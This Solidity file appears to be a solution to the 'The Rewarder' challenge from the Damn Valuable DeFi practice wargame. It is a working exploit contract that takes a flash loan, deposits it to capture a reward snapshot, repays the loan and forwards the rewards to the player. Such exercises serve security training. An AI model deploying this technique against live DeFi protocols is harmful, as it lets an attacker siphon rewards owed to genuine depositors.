// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./FlashLoanerPool.sol";
import "./FlashLoanerPool.sol";

contract Deward {
    address _player;
    FlashLoanerPool _flashLoanPool;
    TheRewarderPool _rewarderPool;
    DamnValuableToken _liquidityToken;
    RewardToken _rewardToken;

    constructor(DamnValuableToken liquidityToken, FlashLoanerPool flashLoanPool, TheRewarderPool rewarderPool, RewardToken rewardToken) {
        _player = msg.sender;
        _liquidityToken = liquidityToken;
        _flashLoanPool = flashLoanPool;
        _rewarderPool = rewarderPool;
        _rewardToken = rewardToken;
    }

    function receiveFlashLoan(uint256 amount) external {
        // move the lent tokens to the rewarder pool
        _liquidityToken.approve(address(_rewarderPool), amount);
        _rewarderPool.deposit(amount);

        // if timed correctly, the rewarder pool sent the rewards

        // payback the loan
        _rewarderPool.withdraw(amount);
        _liquidityToken.transfer(address(_flashLoanPool), amount);

        // transfer the rewards to the player
        uint256 _rewards = _rewardToken.balanceOf(address(this));
        _rewardToken.transfer(_player, _rewards);
    }

    function pwn() public {
        // borrow the maximum
        uint256 _amount = _liquidityToken.balanceOf(address(_flashLoanPool));
        _flashLoanPool.flashLoan(_amount);
    }
}
